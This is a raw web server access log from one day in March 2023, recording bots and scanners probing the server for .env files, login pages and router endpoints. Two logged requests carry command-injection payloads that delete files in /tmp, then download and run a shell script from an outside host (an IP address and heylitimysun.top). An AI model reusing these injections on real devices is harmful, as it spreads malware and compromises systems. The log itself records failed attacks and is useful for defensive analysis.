135.125.246.189 - - [26/Mar/2023:00:22:35 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [26/Mar/2023:00:22:35 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
43.154.141.71 - - [26/Mar/2023:00:33:44 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
193.32.162.159 - - [26/Mar/2023:00:46:27 +0000] "GET / HTTP/1.1" 200 13 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.32.162.159 - - [26/Mar/2023:00:46:37 +0000] "GET /dispatch.asp HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
172.104.11.4 - - [26/Mar/2023:00:48:20 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03Kp\xA5\x13\x92m.\x8E\xE6\xD6\x84\xA6\xF06v\xD7\xAB\x01\xF6\xB2\x8BX\x22\xDE\xE07U\xB4\xDE\x9Ev\xCB\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"
198.235.24.136 - - [26/Mar/2023:01:01:46 +0000] "GET / HTTP/1.0" 200 13 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
43.128.225.120 - - [26/Mar/2023:01:13:59 +0000] "\xFF\xA2\xFF\x00\xFF=\xFF\xAD\xFF\x00\xFF\xD1\xFF\xD8\xF1\xAD\xFF\xBEH\xFB_5\xFF\xAD\xF1" 400 166 "-" "-"
43.128.225.120 - - [26/Mar/2023:01:13:59 +0000] "o\xFA\xC0\xBE\xB8\xC0\xA4\xC9\x89\xA2\xC2\x8F\x83\xAF\x91\x97\xBE\xCD\xB9\xCF\xAC\x9B\xB0\xAB\xA0\xB6\xB1\xAA\x9D\x9C\x9F\x96\x8D\x93\xCE\xB4\xB3\xB5\x98\xCD\xA6\xFA\xFA\xFA\xFA\x12\xFD\xD8\xF8\xFA\xFA\xC2\xFA\xFA\xFA\xFA\x1Af\xEC\xF9\xFA\xFA\xFA\xFA\xFB\xE5q\xF2\xFA\xFA\xFA\xFA\xFA\xFA\xF9wh\x97ui\xBA\xEA=E\xF0\x1B/\xA7XJ\xF11Y\x0B\xBF\xB1K\x1F\x00\xFA\xF8\xAF5Y\xDB\xA1\xA2 \xE00\xCC\xBAU]<\x15\x14\xBA\xC7W7c\x02\x98\xC996\x95\x1C\xC5\x164yR\xE7\x8C\x90\x8E\x06\x92w\xCD\xE9\x0E\x14!\x19\x87KE\xE1\x86 ,)\xEA\x85_\x16I(\x86\x8B?\xADXx\xD7\xE7\xB67\x83\xF1\xFC;\x83\xC8\x0F\xAE\xDD\x1A\xCA\xBF\xD3\xF0\x98\xAA\xD9=\xD0\xD0\xD6\xEF\xABQZ`\xBCrhc@[\x9Cz\xEA\x8AJ|\x8F\xEF\x86V\x11\xDC\xBB\x5C\xF8T\xF3=\x9B\xAF\x11\xBD8\x96\xAD\xE7e~`ov\xCC\xB6\xCA\xDE\xB78\xDC\xD88w9\x91\x8C\xD1\xDE/\x98\xCA\x8D%\xDC\x85+sb\xAE\xE5&\xCA\x08\x06\xFF\x9Ev\xA5\x96\xED\x0F\xBC\xEA2\xFA\x1F7\x03\xC9g\x83)TF$H\xA8\xD2\xA24\x91\x80\xABg\x0CF+\xBFx*w\x19\x01\x0E\xFF\xCF\x1B\xA8\x9AJrF.\x0B\x9D\x84\xF2\xEE\x80Y\x18\xD4\x12\xFE\x14\x89\x9B\x8C\x9AL6\x17\x09\xF25\x5C\xEDb\x02\x89\xCD\xA7|\xC9zL\x97\x81\x92\x96\xA3\xC4g\xB4(\xE3k\x82Gk\xC1\x90B\xE6][\xE1\x02\x9B\x86?Tua\x1C\xE0\xFC\x9F\x8D\xEB\x01\xAB\xC0\xE5\xD6\x98\xD5\xE0<\x93\xEA\x00\x8DT\xE9\x05\x04y-G\x0E\xC5R\x0E\x18\xF4\xC1\xD6\x8E\xBDi\xBBf\xBC1Z-\xFD\x90N\x16\x81\x07C*mk\x11\xBCZ\x02\x85\x95a\xDE\xAB\xA8\xB7\xA3\xA7;\x19\xDE\xB3\xD7" 400 166 "-" "-"
43.128.225.120 - - [26/Mar/2023:01:13:59 +0000] "\x02" 400 166 "-" "-"
43.128.225.120 - - [26/Mar/2023:01:14:05 +0000] "\x00\x00\x00" 400 166 "-" "-"
135.125.246.189 - - [26/Mar/2023:01:19:34 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [26/Mar/2023:01:19:34 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
104.243.37.125 - - [26/Mar/2023:01:28:15 +0000] "GET / HTTP/1.1" 200 13 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
104.243.37.125 - - [26/Mar/2023:01:28:15 +0000] "GET /.env HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
104.243.37.125 - - [26/Mar/2023:01:28:15 +0000] "POST / HTTP/1.1" 405 166 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
43.154.141.71 - - [26/Mar/2023:01:51:23 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
135.125.246.189 - - [26/Mar/2023:01:55:40 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [26/Mar/2023:01:55:40 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
162.142.125.224 - - [26/Mar/2023:02:05:41 +0000] "GET / HTTP/1.1" 200 13 "-" "-"
162.142.125.224 - - [26/Mar/2023:02:05:41 +0000] "GET / HTTP/1.1" 200 13 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.224 - - [26/Mar/2023:02:05:46 +0000] "GET /favicon.ico HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
23.251.102.74 - - [26/Mar/2023:02:18:14 +0000] "GET / HTTP/1.1" 200 13 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.254.196.173 - - [26/Mar/2023:02:35:28 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.173 - - [26/Mar/2023:02:35:29 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
43.154.141.71 - - [26/Mar/2023:03:08:58 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
193.32.162.159 - - [26/Mar/2023:03:17:42 +0000] "GET / HTTP/1.1" 200 13 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.32.162.159 - - [26/Mar/2023:03:17:52 +0000] "GET /dispatch.asp HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
94.102.51.9 - - [26/Mar/2023:03:24:55 +0000] "GET / HTTP/1.1" 200 13 "-" "SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)"
94.102.51.9 - - [26/Mar/2023:03:24:56 +0000] "GET /favicon.ico HTTP/1.1" 404 134 "-" "SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)"
135.125.246.189 - - [26/Mar/2023:03:34:16 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [26/Mar/2023:03:34:16 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
43.154.141.71 - - [26/Mar/2023:04:27:24 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
185.254.196.173 - - [26/Mar/2023:05:26:40 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.173 - - [26/Mar/2023:05:26:44 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
92.118.39.82 - - [26/Mar/2023:05:29:48 +0000] "GET / HTTP/1.1" 200 13 "-" "-"
92.118.39.82 - - [26/Mar/2023:05:29:49 +0000] "GET /cgi-bin/downloadFlile.cgi HTTP/1.1" 404 162 "-" "Hello World"
135.125.246.189 - - [26/Mar/2023:05:40:18 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [26/Mar/2023:05:40:18 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
43.154.141.71 - - [26/Mar/2023:05:45:01 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
5.252.167.165 - - [26/Mar/2023:06:17:01 +0000] "GET /.env HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
5.252.167.165 - - [26/Mar/2023:06:17:01 +0000] "POST / HTTP/1.1" 405 166 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
193.32.162.159 - - [26/Mar/2023:06:40:42 +0000] "GET / HTTP/1.1" 200 13 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.32.162.159 - - [26/Mar/2023:06:40:52 +0000] "GET /dispatch.asp HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.79.181.223 - - [26/Mar/2023:06:59:01 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03z\xA6\xE0\x5C\x9E\xFC\x80\x96\x16\xA0QR\x1ANsn!uL\x02b\xDFQ\xE9\xA2b\x0F\xC9e\xF5Q\xB7\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"
43.154.141.71 - - [26/Mar/2023:07:02:55 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
135.125.244.48 - - [26/Mar/2023:07:07:44 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [26/Mar/2023:07:07:44 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.62.197.83 - - [26/Mar/2023:07:24:39 +0000] "GET / HTTP/1.1" 200 13 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
64.62.197.83 - - [26/Mar/2023:07:25:42 +0000] "GET /favicon.ico HTTP/1.1" 404 134 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
64.62.197.86 - - [26/Mar/2023:07:26:17 +0000] "GET /geoserver/web/ HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
167.99.141.170 - - [26/Mar/2023:07:42:11 +0000] "GET / HTTP/1.1" 200 13 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
13.59.21.246 - - [26/Mar/2023:07:45:06 +0000] "GET / HTTP/1.1" 200 13 "-" "python-requests/2.25.1"
198.199.114.5 - - [26/Mar/2023:07:51:28 +0000] "GET / HTTP/1.1" 200 13 "-" "Mozilla/5.0 zgrab/0.x"
45.81.243.34 - - [26/Mar/2023:08:02:29 +0000] "{D79E94C5-70F0-46BD-965B-E17497CCB598}" 400 166 "-" "-"
43.154.141.71 - - [26/Mar/2023:08:20:30 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
193.32.162.159 - - [26/Mar/2023:08:28:57 +0000] "GET / HTTP/1.1" 200 13 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.32.162.159 - - [26/Mar/2023:08:29:07 +0000] "GET /dispatch.asp HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
172.104.11.46 - - [26/Mar/2023:08:56:12 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\xDD\xF5\xCE+G}\xA0\xC6\xE1$\x02!@En\xBE\xD7\x0ChSE\xF9\x89\x5Cf\x93E\xFDL\xA0Q\xFB\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"
209.97.191.83 - - [26/Mar/2023:08:59:20 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xA0^o\xF9\xA9S\xBAa\x16\x9C\xFF\xCF\x5C\x8D\x16d}\x03\xD79+[`\x88\xEC\x02\x1A\xCD\xBA\xAA\x9Fe\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"
209.97.191.83 - - [26/Mar/2023:08:59:20 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03G\x11u\x1A\xA4\xABR\x05\xF3/\xF0\x14 X\xAE\xD0\x89\x01\xD1\xE8\xBBV\xFE\x04a_U\xF5/\x8B\x88j\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"
209.97.191.83 - - [26/Mar/2023:08:59:20 +0000] "GET / HTTP/1.1" 200 13 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
209.97.191.83 - - [26/Mar/2023:08:59:20 +0000] "GET /client/get_targets HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
209.97.191.83 - - [26/Mar/2023:08:59:20 +0000] "GET /upl.php HTTP/1.1" 404 134 "-" "Mozilla/5.0"
209.97.191.83 - - [26/Mar/2023:08:59:30 +0000] "GET /geoip/ HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
209.97.191.83 - - [26/Mar/2023:08:59:30 +0000] "GET / HTTP/1.1" 200 13 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Snapchat/10.77.0.54 (like Safari/604.1)"
135.125.244.48 - - [26/Mar/2023:09:23:59 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [26/Mar/2023:09:23:59 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
120.233.194.87 - - [26/Mar/2023:09:37:40 +0000] "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 404 162 "-" "-"
43.154.141.71 - - [26/Mar/2023:09:38:16 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
109.237.97.180 - - [26/Mar/2023:10:05:29 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [26/Mar/2023:10:05:29 +0000] "\x16\x03\x01\x01H\x01\x00\x01D\x03\x036\xB2\x02Jp\x0C\xE9\x02\xB7\x94\xEF\x9F?V\x0B\xD1aU\x9F0\xE1\x12\x0B\x88\xEA\xC2H\xF1\x05\xC1/\x04 \xF1V\x00\xC7\xE5\xEF\x9Cn\x19\xC6\x8B\xC44\xF1\x9F\xAD\xC2\x03Is\x8B\x09\x10\x96+X\xCFU \xBE\xCE\x90\x00b\x13\x02\x13\x03\x13\x01\xC0,\xC00\xC0+\xC0/\xCC\xA9\xCC\xA8\x00\xA3\x00\x9F\x00\xA2\x00\x9E\xCC\xAA\xC0\xAF\xC0\xAD\xC0$\xC0(\xC0" 400 166 "-" "-"
162.243.151.27 - - [26/Mar/2023:10:17:21 +0000] "MGLNDD_18.222.50.103_80" 400 166 "-" "-"
45.79.181.251 - - [26/Mar/2023:10:54:41 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03r'\xED@36E]" 400 166 "-" "-"
135.125.244.48 - - [26/Mar/2023:10:57:43 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [26/Mar/2023:10:57:44 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.42.214.118 - - [26/Mar/2023:11:01:15 +0000] "GET / HTTP/1.1" 200 13 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
103.203.57.1 - - [26/Mar/2023:11:19:04 +0000] "GET / HTTP/1.1" 200 13 "-" "HTTP Banner Detection (https://security.ipip.net)"
135.125.244.48 - - [26/Mar/2023:11:22:40 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [26/Mar/2023:11:22:40 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.56.108.128 - - [26/Mar/2023:11:33:32 +0000] "GET /systembc/password.php HTTP/1.0" 404 564 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
43.154.141.71 - - [26/Mar/2023:12:13:37 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
172.104.11.46 - - [26/Mar/2023:13:00:49 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\xFCz\x9C\xB4Z3\x1Ev\x81=\xE2,F\xCE6\xEF\xDAO7\xB2\xAC\xD2\xD67\x14\x0C\xE7(\x19\xB1F\xEC\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"
135.125.244.48 - - [26/Mar/2023:13:46:40 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [26/Mar/2023:13:46:41 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
104.29.47.176 - - [26/Mar/2023:13:59:52 +0000] "GET /cdn-cgi/trace HTTP/1.1" 404 134 "-" "Mozilla/5.0"
193.32.162.159 - - [26/Mar/2023:14:24:46 +0000] "GET / HTTP/1.1" 200 13 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.32.162.159 - - [26/Mar/2023:14:24:56 +0000] "GET /dispatch.asp HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
73.246.224.152 - - [26/Mar/2023:14:25:55 +0000] "GET /bin/zhttpd/${IFS}cd${IFS}/tmp;rm${IFS}-rf${IFS}*;${IFS}wget${IFS}http://163.123.143.126/x.sh;${IFS}sh${IFS}x.sh;" 400 0 "-" "-"
43.154.141.71 - - [26/Mar/2023:14:51:08 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
90.150.203.228 - - [26/Mar/2023:14:58:41 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+heylitimysun.top/jaws;sh+/tmp/jaws HTTP/1.1" 404 162 "-" "Hello, world"
109.237.98.226 - - [26/Mar/2023:15:09:50 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [26/Mar/2023:15:09:50 +0000] "\x16\x03\x01\x01H\x01\x00\x01D\x03\x03\x96\x8D\x18\x10\x04\xA0\x02J\xB9\xF2W\xD1F\x9F\xAE\xF9\x91\xC5}\xDD\x22\xC76\x11\xD9\x8A\xB2\x8F\x97\x8C" 400 166 "-" "-"
45.79.128.205 - - [26/Mar/2023:15:42:19 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\xB96\xB7\xFD\x1C:\x83\xCB\x22\xCA\x17rQP\xD1\xAB\xEE\xB7\xDF3\x7FeU}o\xEB\xFC\x10\xFA(\xB3\x10\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"
135.125.244.48 - - [26/Mar/2023:15:49:46 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [26/Mar/2023:15:49:46 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
128.199.101.62 - - [26/Mar/2023:16:00:54 +0000] "GET /aaa9 HTTP/1.1" 404 134 "-" "Mozilla/5.0 zgrab/0.x"
128.199.101.62 - - [26/Mar/2023:16:00:54 +0000] "GET /aab8 HTTP/1.1" 404 134 "-" "Mozilla/5.0 zgrab/0.x"
128.199.101.62 - - [26/Mar/2023:16:00:55 +0000] "GET / HTTP/1.1" 200 13 "-" "Mozilla/5.0 zgrab/0.x"
92.118.39.82 - - [26/Mar/2023:16:05:44 +0000] "GET / HTTP/1.1" 200 13 "-" "-"
92.118.39.82 - - [26/Mar/2023:16:05:44 +0000] "GET /cgi-bin/downloadFlile.cgi HTTP/1.1" 404 162 "-" "Hello World"
43.154.141.71 - - [26/Mar/2023:16:10:38 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
185.254.196.173 - - [26/Mar/2023:16:14:40 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.173 - - [26/Mar/2023:16:14:43 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [26/Mar/2023:16:53:47 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [26/Mar/2023:16:53:48 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
